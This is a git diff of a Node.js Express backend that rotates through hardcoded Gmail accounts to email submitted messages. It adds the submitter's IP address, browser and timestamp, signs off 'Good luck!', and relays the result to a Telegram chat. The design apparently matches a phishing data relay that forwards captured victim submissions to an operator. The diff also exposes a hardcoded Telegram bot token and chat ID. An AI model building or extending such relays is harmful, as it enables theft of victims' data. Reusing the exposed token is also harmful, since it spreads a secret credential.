@@ -1,9 +1,10 @@
-const express = require("express");
-const nodemailer = require("nodemailer");
-const bodyParser = require("body-parser");
-const cors = require("cors");
-const TelegramBot = require("node-telegram-bot-api");
-const axios = require("axios");
+import express from "express";
+import nodemailer from "nodemailer";
+import bodyParser from "body-parser";
+import cors from "cors";
+import TelegramBot from "node-telegram-bot-api";
+import axios from "axios";
+import fetch from "node-fetch";
 
 const app = express();
 const port = 3001;
@@ -31,7 +32,7 @@ const gmailAccounts = [
 
 // Telegram Bot setup
 const telegramToken = "7637425229:AAEOd39Gvu7O77XXk_pm5FLDTOPcbxqAP3c";
-const telegramBot = new TelegramBot(telegramToken, { polling: true });
+const telegramBot = new TelegramBot(telegramToken);
 const chatId = "5640521477"; // Replace with your chat ID
 const webhookUrl = "https://api-gamma-neon.vercel.app/telegram-webhook"; // Replace with your actual webhook URL
 
@@ -54,7 +55,7 @@ app.get("/", (req, res) => {
   res.end("Welcome to my simple API");
 });
 
-// Rotate email accounts and send emails
+// Modified sendEmailWithRotation function
 const sendEmailWithRotation = (req, subject, message, callback) => {
   let attempt = 0;
 
@@ -74,7 +75,8 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
     const userAgent = req.headers["user-agent"];
     const timestamp = new Date().toISOString();
 
-    const fullMessage = `*Message*\n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address*\n${ipAddress}\n\n*Browser*\n${userAgent}\n\n*Timestamp*\n${timestamp}\n\n_Good luck!_`;
+    // Build the email message, including the Telegram message
+    const fullMessage = `\n${message}\n\n=======================\nAdditional Information\n=======================\n\nIP Address:\n${ipAddress}\n\nBrowser:\n${userAgent}\n\nTimestamp:\n${timestamp}\n\n_Good luck!_`;
 
     const mailOptions = {
       from: user,
@@ -90,16 +92,20 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
         tryNextAccount();
       } else {
         console.log(`Email successfully sent using ${user}.`);
+
+        const escapeMarkdown = (text) => {
+          return text.replace(/[_*[\]()~`>#+-=|{}.!]/g, "\\$&");
+        };
+
+        const formattedMessage = escapeMarkdown(`Subject: ${subject}\n\n${fullMessage}`);
+
         telegramBot
-          .sendMessage(chatId, `*Subject:* ${subject}\n\n${fullMessage}`, {
-            parse_mode: "Markdown",
+          .sendMessage(chatId, formattedMessage, {
+            parse_mode: "MarkdownV2",
           })
           .then(() => callback(null, { message: "Success", info }))
           .catch((telegramError) => {
-            console.error(
-              "Failed to send Telegram message:",
-              telegramError.message
-            );
+            console.error("Failed to send Telegram message:", telegramError.message);
             callback("Telegram message failed", null);
           });
       }
@@ -108,6 +114,7 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
 
   tryNextAccount();
 };
+
 
 app.get("/location", async (req, res) => {
   const response = await fetch("http://ip-api.com/json/");
@@ -149,7 +156,9 @@ app.post("/gowt", (req, res) => {
   const tryNextAccount = () => {
     if (attempt >= gmailAccounts.length) {
       console.log("All Gmail accounts have been tried, email sending failed.");
-      return res.status(500).json({ error: "Failed to send email with all accounts" });
+      return res
+        .status(500)
+        .json({ error: "Failed to send email with all accounts" });
     }
 
     const { user, pass } = gmailAccounts[attempt];
@@ -195,7 +204,6 @@ app.post("/gowt", (req, res) => {
   // Start trying to send the email with the first account
   tryNextAccount();
 });
-
 
 app.post("/telegram-webhook", (req, res) => {
   console.log("Telegram webhook triggered:", JSON.stringify(req.body, null, 2));
